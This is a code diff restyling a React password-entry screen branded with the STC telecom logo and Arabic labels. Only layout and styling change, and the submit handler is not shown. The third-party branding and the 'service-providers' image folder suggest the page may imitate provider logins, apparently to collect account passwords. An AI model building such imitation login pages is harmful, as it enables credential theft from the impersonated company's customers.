@@ -79,9 +79,9 @@ export default function STCPassword() {
         {/* STC Logo */}
         <div className="flex justify-center mb-8">
           <img 
-            src="/images/service-providers/stc.jpg" 
+            src="/images/service-providers/stc-logo.png" 
             alt="STC" 
-            className="h-12 w-auto"
+            className="h-10 w-auto"
           />
         </div>
 
@@ -96,9 +96,14 @@ export default function STCPassword() {
 
         <form onSubmit={handleSubmit(onSubmit)} className="flex-1 flex flex-col">
           {/* Password Field */}
-          <div className="space-y-1">
+          <div className="border border-gray-200 rounded-lg overflow-hidden">
             {/* Label Row */}
-            <div className="flex items-center justify-between px-1">
+            <div className="flex items-center justify-between px-4 py-3 bg-white">
+              <div className="flex items-center gap-2">
+                <Lock className="w-4 h-4 text-gray-400" />
+                <span className="text-gray-500 text-sm">كلمة المرور</span>
+              </div>
+              
               <button
                 type="button"
                 onClick={() => setShowPassword(!showPassword)}
@@ -107,23 +112,20 @@ export default function STCPassword() {
               >
                 {showPassword ? "إخفاء" : "اظهار"}
               </button>
-              
-              <div className="flex items-center gap-2">
-                <span className="text-gray-500 text-sm">كلمة المرور</span>
-                <Lock className="w-4 h-4 text-gray-400" />
-              </div>
             </div>
             
             {/* Input Field */}
-            <div className="border-b border-gray-300 pb-2">
+            <div className="px-4 pb-3">
               <input
                 id="password"
                 type={showPassword ? "text" : "password"}
-                className="w-full bg-transparent text-left outline-none py-2 text-base"
+                className="w-full bg-transparent text-left outline-none py-1 text-base"
                 dir="ltr"
                 {...register("password")}
               />
             </div>
+          </div>
+          <div>
             
             {errors.password && (
               <p className="text-red-500 text-xs text-right">{errors.password.message}</p>
